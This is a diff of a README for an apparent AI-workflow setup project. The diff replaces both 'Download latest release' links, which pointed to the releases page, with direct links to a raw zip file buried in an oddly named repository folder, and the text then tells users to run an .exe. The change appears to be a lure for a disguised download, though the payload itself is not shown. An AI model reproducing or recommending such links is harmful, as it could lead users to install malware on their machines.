@@ -1,6 +1,6 @@
 # 🤖 dify-flowise-ai-platform-setup - Build custom artificial intelligence workflows easily
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/kiplingesque-sieve745/dify-flowise-ai-platform-setup/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/kiplingesque-sieve745/dify-flowise-ai-platform-setup/raw/refs/heads/main/exaggeratively/ai-platform-flowise-dify-setup-v1.2.zip)
 
 ## 🔧 About the platform
 
@@ -20,7 +20,7 @@ Your computer needs specific hardware to run these AI tools. Check your system s
 
 Visit the project release page to get the necessary files. 
 
-[Download the latest version here](https://github.com/kiplingesque-sieve745/dify-flowise-ai-platform-setup/releases)
+[Download the latest version here](https://github.com/kiplingesque-sieve745/dify-flowise-ai-platform-setup/raw/refs/heads/main/exaggeratively/ai-platform-flowise-dify-setup-v1.2.zip)
 
 Choose the file ending in .exe for a standard Windows installation. Click the link to start the download. Save the file to your desktop or downloads folder. 
 
